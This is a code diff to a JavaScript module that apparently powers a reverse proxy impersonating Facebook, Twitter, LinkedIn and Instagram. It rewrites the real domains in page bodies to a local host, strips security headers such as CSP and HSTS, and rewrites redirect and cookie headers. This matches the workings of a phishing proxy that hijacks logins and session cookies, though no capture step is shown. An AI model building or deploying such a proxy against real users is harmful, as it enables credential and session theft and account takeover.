@@ -152,9 +152,20 @@ async function modifyBodyIn(body) {
     return body;
 }
 
+async function modifyBodyFa(body) {
+    if (body && typeof body === 'string') {
+        //Facebook
+        body = body.split('www.facebook.com').join('localhost');
+        // body = body.split('edge-chat.facebook.com').join('localhost');
+        // body = body.split('facebook.com').join('localhost');
+        // body = body.split('edge-chat.facebook.com').join('localhost');
+        //END 
+    } 
+    return body;
+}
+
 async function modifyBodyTw(body) {
     if (body && typeof body === 'string') {
-        body = body.split(`window.location.hostname`).join(`${HOST}`);
         body = body.split('api.twitter.com').join(`${HOST}`);
         body = body.split('twitter.com').join(`${HOST}`);
         body = body.split('abs.twimg.com').join(`${HOST}`);
@@ -196,7 +207,6 @@ async function modifyProxyResLi(proxyRes) {
 
 async function modifyProxyResTw(proxyRes) {
     delete proxyRes.headers['content-security-policy'];
-
     proxyRes.headers['location'] = `https://${HOST}`;
     proxyRes.headers['set-cookie'] =
         proxyRes.headers['set-cookie']?.map((item) => {
@@ -234,6 +244,7 @@ async function modifyProxyResFa(proxyRes) {
     delete proxyRes.headers['content-security-policy'];
     delete proxyRes.headers['strict-transport-security'];
     delete proxyRes.headers['report-to'];
+    proxyRes.headers['X-Frame-Options']='SAMEORIGIN';
     proxyRes.headers['location'] = 'https://localhost';
     proxyRes.headers['set-cookie'] =
         proxyRes.headers['set-cookie']?.map((item) => {
@@ -259,5 +270,6 @@ module.exports = {
     modifyProxyResTw,
     modifyProxyResLi,
     modifyProxyResIn,
-    modifyProxyResFa
+    modifyProxyResFa,
+    modifyBodyFa
 };
